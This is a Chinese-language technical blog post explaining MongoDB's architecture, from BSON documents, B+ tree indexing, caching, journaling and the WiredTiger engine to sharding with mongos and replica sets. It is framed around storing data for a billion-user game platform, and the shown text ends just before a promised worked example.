code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是一个程序员， 老板要你做个游戏平台，支撑十多亿游戏用户数据的写入和存储。</p>
<p>游戏用户包含多种字段，比如id, 装备、是否参与过节日活动等，功能不断迭代，需要支持扩展各种属性字段以及多维度查询。比如没参加过情人节活动的剑士有哪些？</p>
<p>那么问题就来了，你会选择使用什么，存储这么大量的游戏数据？</p>
<p>聊到存储，很容易想到可以使用MySQL数据库，将id、装备，活动等做成一个像excel的数据表。</p>
<p>为了支持多维度查询，我们需要为每个可能的属性都预留字段，甚至加上索引。比如预留春节、情人节活动等各种字段，但大多数角色并不会全部活动都参与，所以很多预留的字段都用不上，浪费空间。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96db418bdb404cd58175083a1cfb8c30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=4CoDDMzinQLi1ufJ2iRnJ8fLkAk%3D" alt="很多预留的字段都用不上" loading="lazy"/></p>
<p>很多预留的字段都用不上</p>
<p>而且游戏迭代频繁，每次增加活动时，都需要修改表结构，很麻烦。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a85fbb8f809340ec8114e8ba3369b415~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=3NWJMx1UWm%2FOkyG1%2Frqc%2BQzFZpU%3D" alt="每次增加活动都需要修改表结构" loading="lazy"/></p>
<p>每次增加活动都需要修改表结构</p>
<p>那么问题就来了，有没有一种既灵活又高效的存储方案？</p>
<p>有！没有什么是加一层中间层不能解决的，如果有，那就再加一层。</p>
<p>这次我们要加的中间层，是 MongoDB。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2777837f8559413b82e0b5c3e1cff2ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=eFHaEoI9NL6r65l72q%2FL4%2Fma1LI%3D" alt="MongoDB是什么" loading="lazy"/></p>
<p>MongoDB是什么</p>
<h2 data-id="heading-0">MongoDB是什么？</h2>
<p>先说结论，MongoDB可以简单理解为，就是个"数据结构灵活点的Mysql"。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c2f5044a70849019abe1dd061fab7d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=p8Um6S2RGeVNFcwBnnTwSJW95zE%3D" alt="mongodb是数据结构灵活点的Mysql" loading="lazy"/></p>
<p>mongodb是数据结构灵活点的Mysql</p>
<p>Mysql的表是由多个行组成，每个行又由多个列组成。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e92ee5c3647e468891cfdcab846f16c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=2HlsWuCp9MFHcZMV361wtTapUOw%3D" alt="表由行组成" loading="lazy"/></p>
<p>表由行组成</p>
<p>由于"列"这一概念的存在，导致了前面提到的表扩展和字段预留空间浪费的问题。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac23794f93d643708608b9f9dc6254de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=2panOmLmt63WIwOxErFicXE6OS8%3D" alt="列的概念存在导致了问题" loading="lazy"/></p>
<p>列的概念存在导致了问题</p>
<p>那我们索性抛弃列这个概念，将原来的多个列，聚合到一个长得像json的数据结构里，对于没用到的字段，不用预留，干脆就没有，我们管它叫文档, document，就像这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef63c4fac152486bbe30151810820b14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=LS1j56xVJ56ylFLdrsRYjl57240%3D" alt="文档document" loading="lazy"/></p>
<p>文档document</p>
<p>每个文档都有一个_id字段，也叫主键ID, 跟mysql表的主键ID是一个意思，用来唯一定位数据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9aa24af606b40d38f4188cbd2e87d72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=fZc4FIVetqwdMn4nZtgSwO1ZZFU%3D" alt="主键ID" loading="lazy"/></p>
<p>主键ID</p>
<p>文档内部想加什么字段就加什么字段，文档和文档之间的字段不需要完全一致，比如A文档有是否拜师字段，B文档没有。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a4134c51e294516b40a81465cef24f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=8vi8roJ3RBqWxrH7x9csz6GbuMc%3D" alt="文档和文档之间的字段不需要完全一致" loading="lazy"/></p>
<p>文档和文档之间的字段不需要完全一致</p>
<p>这样就完全不需要像 MySQL 那样提前定义表结构。</p>
<p>之前MySQL数据表里的一行数据，现在就成了一个文档。</p>
<p>既然MySQL的多行数据可以组合到一起，构成一张数据表，那多个文档也可以组合到一起，构成一个集合，又叫collection。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85f1987cd66744168bf5392c7f948d6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=pln3xRnahErKhlTbCx9tTDo9zkI%3D" alt="collection" loading="lazy"/></p>
<p>collection</p>
<p>文档和集合都是MongoDB里的核心概念。</p>
<p>如果说mysql是一个，用于读写数据表行列的服务进程，那MongoDB本质上就是个，用于读写集合文档的服务进程。</p>
<p>我们通常会使用SQL语句，读写MySQL的数据，MongoDB也有自己的查询语法，而且看起来跟SQL差异比较大，</p>
<p>比如MongoDB的find语句类似于mysql的select语句。updateOne就类似于mysql的update语句。</p>
<p>对应关系就像下面这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30b62157b5b048d7b87736357f729a30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=nQ8ZfKxKMqGcem%2FJ8IC%2FdZaYZ74%3D" alt="查询语句" loading="lazy"/></p>
<p>查询语句</p>
<p>接下来，我们假装不了解MongoDB，来看下它是怎么实现的。</p>
<p>看之前，你点赞了吗？关注了吗？谢谢！</p>
<h2 data-id="heading-1">BSON 编码</h2>
<p>前面提到，文档长得像JSON，但JSON只支持数字，字符串这类基础类型，想要表达二进制这类常用存储类型，还要做一层Base64编码，不够高效，既然MongoDB的定位是存储，那当然要支持二进制的高效读写。所以，我们在JSON的基础上做下扩展，让它直接支持二进制等数据类型，也就成了二进制JSON，Binary JSON，简称BSON。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/def7b8ed8cba4cc0b5a7e2567e58d450~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=ACHT7gwjCbuDzu7%2FXsTMcvJ%2FvMY%3D" alt="BSON" loading="lazy"/></p>
<p>BSON</p>
<h2 data-id="heading-2">数据页</h2>
<p>有了BSON文档，下一步就是考虑将它们持久化到磁盘中。</p>
<p>就像excel数据表在磁盘上是个.xls 文件，我们也可以将一个个BSON文档组成的集合，写到磁盘里.wt为后缀名的文件上。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ed1f32487c4413389902597097cfd09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=XecYlLLR5ruMJQ88MAUFP1WJZ6Y%3D" alt="wt后缀文件" loading="lazy"/></p>
<p>wt后缀文件</p>
<p>集合越大，磁盘上的文件也就越大。</p>
<p>直接读写一个大文件里的全部数据会很慢，所以将数据拆成一个个数据页，每个页大小 32KB。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8461d39388747abb1a4abaf1c33bead~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=dxNnSNgCsu4olc1xBjYW%2BfwR5QI%3D" alt="每个页大小 32KB" loading="lazy"/></p>
<p>每个页大小 32KB</p>
<p>现在如果我们需要通过服务进程，读写某些个BSON文档数据，就只需要读写磁盘里的某几个数据页就好，不需要加载整个wt文件，大大减少了 IO 开销。</p>
<h2 data-id="heading-3">变种 B+ 树索引</h2>
<p>集合里的多个文档，已经分散到多个32KB的数据页里，多个数据页又组成了.wt文件。</p>
<p>那问题就来了，如果我们已知某个文档主键_id，怎么快速找到包含这个文档的数据页呢？</p>
<p>好办，可以为每个数据页加入页号。</p>
<p>由于每个文档本身就自带一个_id主键，我们可以按主键大小排序，将每个数据页里最小的主键序号和所在页的页号提出来，放入到一个新生成的数据页中，并且给数据页加入层级的概念。</p>
<p>这样我们就可以通过上层的数据页快速缩小查找范围，最终定位到要查的数据页。通过这个方式，加速查找数据页的过程。</p>
<p>现在页跟页之间看起来就像是一棵倒过来的树，这棵可以加速查找数据页的树，就是我们常说的B+树索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/018e8b2b154a44b4b2abee616e0f2c5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=vxkGwFYIbiH5UdV9O5xJL7s29xc%3D" alt="B+树索引" loading="lazy"/></p>
<p>B+树索引</p>
<p>上面提到的是针对主键的索引，叫主键索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/077d3617efed40348f12c2fa30661d34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=8vvcXkrK2T%2B6DRgKlwzkZ6fO7Pk%3D" alt="主键索引" loading="lazy"/></p>
<p>主键索引</p>
<p>按同样的思路，也可以为其他文档字段去建立索引，比如用户名字段，这样我们就能快速查找到名字为 xx 的用户有哪些，这就是所谓的辅助索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f8205059e424988a01fa75e6acbeec1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=g8hovpAgrM%2FvwqX4wZ9My2LhjEc%3D" alt="辅助索引" loading="lazy"/></p>
<p>辅助索引</p>
<p>这一点跟mysql的B+树几乎一模一样，但不同的是，mysql更新B+树的数据页时，为了防止并发写冲突，从根到叶子节点的搜索中会加入短暂内存锁，并对目标叶的行记录加锁；而MongoDB写数据时，几乎不对数据页加锁，直接复制个新的数据页，出来写，也就是所谓的写时复制, Copy On Write**，这样原来的数据页还能对外提供读操作，写操作则在新的数据页上进行，两者互不影响。</p>
<p>后面再找机会将复制出来的页合并到原有的B+树结构中，这样并发读写性能更好。</p>
<p>从效果上来看，就像是在原来的B+树基础上，挂了多个复制页，本质上是变种B+树。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f80ae2ef8a05429783d461e2e6c8061a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=%2FgNJp3I25m3mKFKyYIyOi64EQhs%3D" alt="变种B+树" loading="lazy"/></p>
<p>变种B+树</p>
<p>注意，网上有很多说mongodb底层用的是，非叶子节点包含完整文档数据的b树，别听他们的，以我为准。</p>
<h2 data-id="heading-4">加入缓存</h2>
<p>有了索引，查询数据是变高效了，但数据本质上，还是在磁盘里，每次查询都要读磁盘，略慢了些。</p>
<p>怎么办呢？我们可以在服务进程里加个缓存，也叫Cache，把经常访问的磁盘热点数据页放到cache里，查询优先查cache，查不到再去查磁盘，这样磁盘IO变少，查询就快多了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ffa3fafca904f4aa48c377345e7aa28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=nxAeao3YjOgFNqAzJ6d%2FT5xK5ks%3D" alt="加个缓存" loading="lazy"/></p>
<p>加个缓存</p>
<p>怕数据量太大内存扛不住，还可以根据一些策略删除掉一些内存。比如可以将最近最少使用的内存删掉，也就是， Least Recently Used, LRU**,这样不仅解决了内存过大的问题，还让 缓存里的数据全是热点数据。真是一箭双雕。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35436dc3fdaa4f13ba10a6f2102885bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=oZoyYaYQiYsNlkC%2FuV9hUV5MMrk%3D" alt="LRU" loading="lazy"/></p>
<p>LRU</p>
<h2 data-id="heading-5">写前日志 Journal</h2>
<p>上面提到的Cache里的数据页，本质上都是内存。</p>
<p>如果服务崩了，内存里的数据页还没来得及写入磁盘，那数据不就丢了吗？有解法吗？</p>
<p>有！对所有写操作，都先将变更行为，记录到一个叫Journal Buffer的缓冲区里，然后再更新到数据页中，Journal Buffer的数据会定时刷到磁盘的Journal文件中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1687a15e6837417eac21fbb5c9c19b0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=kxMwozE%2Fpl1cpg136A%2FDJI5oUPs%3D" alt="Journal是什么" loading="lazy"/></p>
<p>Journal是什么</p>
<p>如果服务进程崩溃了，那进程重启后，就能通过Journal文件找到历史操作记录，重做数据，尽可能保证数据不丢失。</p>
<p>这时候问题就来了，我有这功夫更新 Journal 文件，直接将 cache的数据写入到磁盘不香吗？</p>
<p>不太一样，Journal文件 是<strong>顺序</strong>写入的，cache 的内存数据是<strong>随机分散</strong>在磁盘各处的，<strong>顺序写磁盘性能是随机写的几十倍</strong>，所以很多存储系统在写数据时都会搞个日志来记录操作，方便服务重启后进行数据对账，确保数据的一致性和完整性，这类操作就是所谓的 Write-Ahead Logging (WAL) 。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dfac22f4afb42f48c0e802e39ce78fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=7l9YHZ63iBh6Knf06Lj%2Bp90lMWI%3D" alt="WAL是什么" loading="lazy"/></p>
<p>WAL是什么</p>
<h2 data-id="heading-6">Checkpoint机制</h2>
<p>注意，上面提到先记录Journal写操作，再更新数据页，此时数据依然在内存中，那内存中的数据什么时候写入磁盘呢？</p>
<p>如果等内存满了再写，一次写入量太大，性能会很差。如果写得太频繁，又会占用磁盘IO，影响读操作。</p>
<p>怎么办？</p>
<p>我们可以让系统，定期把内存中已修改但未写入磁盘的数据页，也就是脏页，一次性批量写入磁盘。这种定期批量写入的机制，这就是所谓的Checkpoint机制。</p>
<p>因为数据已经安全写入磁盘了，所以在这个时间点之前的Journal日志就可以删除了，不需要再保留这些历史操作记录。</p>
<h2 data-id="heading-7">WiredTiger是什么？</h2>
<p>到这里，我们通过BSON文档，这种可以包含任意字段的数据结构，替代了mysql的行列的概念，让存储格式更加灵活。</p>
<p>将文档放入数据页和wt文件中，实现了高效的磁盘存储。</p>
<p>再通过变种B+树索引和写时复制机制，实现了快速数据查找和高并发写入。</p>
<p>为了进一步提升性能，引入了Cache，把热点数据放到内存中，大幅减少了磁盘IO。</p>
<p>用写前日志Journal和Checkpoint机制，保证了数据持久化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/260d41a4cead4143bdea756562561a41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=Gw5800rYuQWC9xY60ZLtMnc4w3M%3D" alt="WiredTiger" loading="lazy"/></p>
<p>WiredTiger</p>
<p>它们共同构成了 <strong>WiredTiger</strong> 存储引擎。并对外提供一系列函数接口。比如update()用于更新数据，search()用于查询数据。</p>
<p>我们平时写的mongodb查询语句，最终都会转换成 WiredTiger 提供的函数接口调用。</p>
<p>比如updateOne()会转换为update()方法。</p>
<p>find()会转换为search()方法。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2da35b9a228a40609d804393a3aca9f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=aQevvYEcAFjt4Mvj5WwoGrBJ7e4%3D" alt="mongodb_配图.026.png" loading="lazy"/></p>
<p>mongodb查询语句</p>
<p>但问题就来了，我们平时读写 mongodb 用的查询语句，是怎么转成存储引擎的函数接口的呢？</p>
<p>那就需要介绍 Server 层了。</p>
<h2 data-id="heading-8">Server 层架构</h2>
<p>Server 层，本质上是mongodb查询语句 和 WiredTiger 存储引擎之间的中间层。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09459f1a6d354ba88c28a41e7eb29652~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=Khd5WWL2FQoxZLq4h8Zg6Ck0R1E%3D" alt="Server 层" loading="lazy"/></p>
<p>Server 层</p>
<p>它内部有一个连接管理模块，用于管理来自客户端应用的网络连接。</p>
<p>还有一个查询解析器，用于解析 MongoDB 的查询语句语法，判断查询语句有没有语法错误，比如字段名是否正确等。</p>
<p>再提供一个查询优化器，用于根据一定的规则选择该用什么索引，生成执行计划。</p>
<p>之后，提供一个执行器，根据执行计划去调用WiredTiger 存储引擎的接口函数。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a60ef5adfd03482c887005d398604ccb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=lwYdr6GoQsHr6B491wKeYdp3cQo%3D" alt="server层内部" loading="lazy"/></p>
<p>server层内部</p>
<p><strong>server 层和</strong>存储引擎层共同构成了一个完整的文档数据库，它就是我们常说的 <strong>MongoDB 数据库</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f7365311c124b5cb7eedf4b4ff1b22c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=ycqimMAK%2BsgReT24ckAXaQxa%2FrM%3D" alt="MongoDB 数据库" loading="lazy"/></p>
<p>MongoDB 数据库</p>
<p>并且，查询引擎和存储引擎层是通过接口函数进行解耦的，换句话说就是，只要实现了上面这些接口函数，就能作为存储引擎与server层对接。</p>
<p>比如，MongoDB 早期用的是 MMAPv1 存储引擎，后来才支持的 WiredTiger。现在 WiredTiger 已经成为默认的存储引擎。</p>
<h2 data-id="heading-9"><strong>oplog 是什么</strong></h2>
<p>你听说过删库跑路吧，为了防止数据库表被删除带来的影响， server 层会将历史上<strong>所有变更操作记录到磁盘上的日志文件中</strong>，这个日志文件就是所谓的 <strong>oplog</strong> 。一旦误删集合，就可以利用 <strong>oplog</strong> 来恢复数据。</p>
<p>那么问题就来了，wiretiger 有一个 Journal日志 也做类似的事情，为什么还要多此一举？评论区告诉我答案。</p>
<h2 data-id="heading-10">单机MongoDB</h2>
<p>如果你看过我之前做的「mysql」相关的视频，你会发现，mongodb和mysql的架构实现，惊人的相似。</p>
<p>我甚至演都不演了，很多素材都直接复用了。</p>
<p>如果说mysql本质上就是个通过b+树，读写数据页里行列数据的单机服务。那mongodb就是个通过变种b+树，读写数据页里集合数据的单机服务。</p>
<p>MongoDB在WiredTiger存储引擎的加持下，高性能是有了，但高可扩展和高可用是一点没看到。回到视频开头的问题，面对十亿级数据量时，单机CPU、内存、磁盘都会成为瓶颈。我们先看下怎么解决扩展性问题。</p>
<h2 data-id="heading-11">高扩展性</h2>
<p>既然数据量太大，那我们就「切」。</p>
<p>将10亿条游戏用户数据，按主键ID范围切分，0到1kw放一个MongoDB里，1kw到2kw放另一个MongoDB里，每个MongoDB只处理1kw条数据。我们称每个MongoDB为一个分片。</p>
<p>再将多个MongoDB分片分散部署在多台机器上，每台机器就是一个Node。通过增加Node来缓解资源压力。</p>
<p>但这又引入了新问题，<strong>客户端应用怎么知道，某条数据存储在哪个分片上？</strong></p>
<p>我们可以在客户端和分片之间，加一层路由服务，它可以根据查询条件，计算出数据在哪个分片，然后转发请求到分片中、收集分片的结果、合并排序**后返回给客户端。这个路由服务，又叫mongos，当读写请求量变大时，mongos也可以扩展。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6155db7251de43f1ad0fac21625f93b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=4TmBjrBYRviO0sTlSgCwFCWa%2Bh4%3D" alt="mongos是什么" loading="lazy"/></p>
<p>mongos是什么</p>
<p>mongos的配置信息，来自于配置服务器，Config Server**，每个分片都连接config server，并主动上报自身信息，所以Config Server存储了有哪些分片，以及每个分片负责哪些数据范围等信息。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9da9b78f16d4ef48fcbc1145ebddec0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=v091wnpJIZmtj0mErV6pWPGd%2BhE%3D" alt="Config Server是什么" loading="lazy"/></p>
<p>Config Server是什么</p>
<h2 data-id="heading-12">高可用</h2>
<p>到这里，问题又又来了，如果其中一个Node挂了，那Node里所有分片都无法对外提供服务了。怎么做到高可用？送分题了属于是，我们可以给每个分片都多加几个副本。</p>
<p>将分片分为主节点和副本节点。主节点将数据实时同步给副本节点，副本节点既可以对外提供读能力，还能在主节点挂了的时候，通过选举机制升级成新的主节点，保证系统高可用。</p>
<p>这种由一个主节点和多个副本节点组成的集群，就叫副本集，Replica Set**，。有点类似于mysql的主从模式。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36a7fb7120d145959df94262bd2fd5dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=ZOh3QhilYICTEJ%2Bysd7Ss%2FoZ9yU%3D" alt="Replica Set" loading="lazy"/></p>
<p>Replica Set</p>
<h2 data-id="heading-13">分布式MongoDB集群</h2>
<p>像这种通过多个MongoDB实例切分存储数据，实现扩展性，并通过mongos路由分发请求、聚合排序结果，通过Config Server管理配置信息，再给每个分片实例加入副本节点实现高可用的架构，就叫分布式MongoDB集群。</p>
<p>接下来我们用一个实际例子将上面提到的内容串起来，看看分布式MongoDB集群中的完整数据流程。</p>
